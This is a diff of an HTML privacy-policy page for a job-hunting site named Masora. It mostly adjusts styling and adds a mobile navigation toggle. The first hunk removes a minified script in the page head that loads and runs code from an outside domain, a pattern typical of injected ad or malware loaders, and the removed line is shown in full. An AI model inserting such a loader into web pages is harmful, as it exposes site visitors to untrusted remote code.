@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9547412,document.createElement('script'))</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="noindex, nofollow" />
@@ -18,6 +17,7 @@
       font-family: 'Segoe UI', sans-serif;
       background-color: #000;
       color: #fff;
+      overflow-x: hidden;
     }
 
     .header {
@@ -38,13 +38,13 @@
     }
 
     .logo img {
-      height: 60px;
+      height: 50px;
       margin-right: 10px;
       border-radius: 8px;
     }
 
     .logo span {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: bold;
       color: #FFD700;
     }
@@ -60,12 +60,32 @@
       font-weight: 500;
     }
 
+    .menu-toggle {
+      display: none;
+      font-size: 26px;
+      color: #FFD700;
+      cursor: pointer;
+    }
+
     @media (max-width: 768px) {
       nav {
+        display: none;
         flex-direction: column;
         background: #111;
-        padding: 10px;
+        position: absolute;
+        top: 70px;
+        right: 20px;
+        padding: 15px;
         border-radius: 10px;
+        width: 200px;
+      }
+
+      nav.active {
+        display: flex;
+      }
+
+      .menu-toggle {
+        display: block;
       }
     }
 
@@ -89,7 +109,8 @@
       margin-top: 25px;
     }
 
-    .section p, .section ul {
+    .section p,
+    .section ul {
       color: #ccc;
       line-height: 1.7;
     }
@@ -97,6 +118,11 @@
     .section ul {
       padding-left: 20px;
       list-style: square;
+    }
+
+    a.mail-link {
+      color: #FFD700;
+      text-decoration: underline;
     }
 
     footer {
@@ -113,14 +139,14 @@
   </style>
 </head>
 <body>
-
   <!-- Header -->
   <header class="header">
     <div class="logo">
-      <img src="/logo.jpg" alt="Masora Logo" />
+      <img src="/logo.jpg" alt="Masora Logo">
       <span>Masora</span>
     </div>
-    <nav>
+    <div class="menu-toggle" id="menu-toggle"><i class="fas fa-bars"></i></div>
+    <nav id="nav-menu">
       <a href="/">Home</a>
       <a href="/about-us.html">About</a>
       <a href="/job-hub.html">Job Hunt</a>
@@ -129,7 +155,7 @@
     </nav>
   </header>
 
-  <!-- Privacy Section -->
+  <!-- Privacy Policy Section -->
   <section class="section" data-aos="fade-up">
     <h1>Privacy Policy</h1>
     <p><strong>Effective Date:</strong> July 12, 2025</p>
@@ -168,7 +194,7 @@
     <p>We may link to third-party sites (like job portals or social media). We’re not responsible for their privacy practices.</p>
 
     <h2>7. Your Rights</h2>
-    <p>You can request to view, edit, or delete your data anytime by emailing us at <a href="mailto:mansoorshaik@masora.store" style="color:#FFD700;">mansoorshaik@masora.store</a>.</p>
+    <p>You can request to view, edit, or delete your data anytime by emailing us at <a href="mailto:mansoorshaik@masora.store" class="mail-link">mansoorshaik@masora.store</a>.</p>
 
     <h2>8. Updates to Policy</h2>
     <p>We may update this policy occasionally. Please check this page for any future updates.</p>
@@ -183,10 +209,14 @@
     <p>&copy; 2025 Masora. All rights reserved.</p>
   </footer>
 
-  <!-- AOS -->
+  <!-- Scripts -->
   <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
   <script>
     AOS.init();
+
+    document.getElementById("menu-toggle").addEventListener("click", function () {
+      document.getElementById("nav-menu").classList.toggle("active");
+    });
   </script>
 </body>
 </html>
